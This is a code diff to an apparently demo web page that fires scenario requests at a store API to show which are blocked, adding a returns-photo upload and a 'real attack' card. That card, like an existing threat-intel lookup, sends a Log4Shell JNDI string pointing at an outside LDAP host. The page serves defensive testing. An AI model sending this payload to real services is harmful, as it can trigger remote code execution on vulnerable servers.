@@ -48,8 +48,16 @@ code { font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; background: va
 <p>GET /api/shop/stock. A store app refreshing BILLY stock on a busy Saturday.</p></div>
 <button class="primary" data-run="stock">Send 8</button></div><div class="result" id="r-stock"></div></div>
 
-<div class="card"><div class="row"><div><h2>Store inventory sync job (python-requests)</h2>
-<p>A browser cannot change its User-Agent, so run this one from a terminal: <code>./scripts/demo-blocks.sh</code></p></div></div></div>
+<div class="card"><div class="row"><div><h2>Returns portal: customer uploads a 600 KB photo of a damaged item</h2>
+<p>POST /api/shop/returns/photos. A real customer, a normal phone photo.</p></div>
+<button class="primary" data-run="returns">Send</button></div><div class="result" id="r-returns"></div></div>
+
+<div class="card"><div class="row"><div><h2>Real attack: Log4Shell in a request header</h2>
+<p>GET /api/shop/products with X-Api-Version: \${jndi:ldap://…}. This one should stay blocked: ask the agent and it should say so.</p></div>
+<button class="primary" data-run="attack">Send</button></div><div class="result" id="r-attack"></div></div>
+
+<div class="card"><div class="row"><div><h2>Store inventory sync (python-requests) and partner price feed (Go-http-client)</h2>
+<p>A browser cannot change its User-Agent, so run these from a terminal: <code>./scripts/demo-blocks.sh</code></p></div></div></div>
 
 <script>
 const HOST = location.host;
@@ -61,6 +69,10 @@ const SCENARIOS = {
     body: () => JSON.stringify({ design: "kitchen-3d-export", units: "cm", mesh: "A".repeat(300000) }) },
   soc: { label: "SOC threat-intel lookups", scenario: "managed", method: "GET", path: "/api/shop/soc/lookup",
     query: "?ioc=" + encodeURIComponent("\${jndi:ldap://203.0.113.66:1389/a}") },
+  returns: { label: "returns portal photo uploads", scenario: "custom", method: "POST", path: "/api/shop/returns/photos", query: "",
+    body: () => JSON.stringify({ orderId: "RET-1042", item: "KALLAX shelf", photo: "data:image/jpeg;base64," + "Q".repeat(600000) }) },
+  attack: { label: "product API calls", scenario: "managed-header", method: "GET", path: "/api/shop/products", query: "",
+    headers: { "X-Api-Version": "\${jndi:ldap://203.0.113.66:1389/a}" } },
   stock: { label: "store stock checker lookups", scenario: "ratelimit", method: "GET", path: "/api/shop/stock", query: "?item=BILLY-80x28&store=445", times: 8 }
 };
 
@@ -76,6 +88,7 @@ async function send(s) {
   const xcid = document.getElementById("xcid").value.trim();
   if (xcid) headers["x-client-id"] = xcid;
   if (s.body) headers["content-type"] = "application/json";
+  Object.assign(headers, s.headers || {});
   const res = await fetch(s.path + s.query, { method: s.method, headers, body: s.body ? s.body() : undefined, cache: "no-store" });
   return { status: res.status, ray: res.headers.get("cf-ray") || "" };
 }
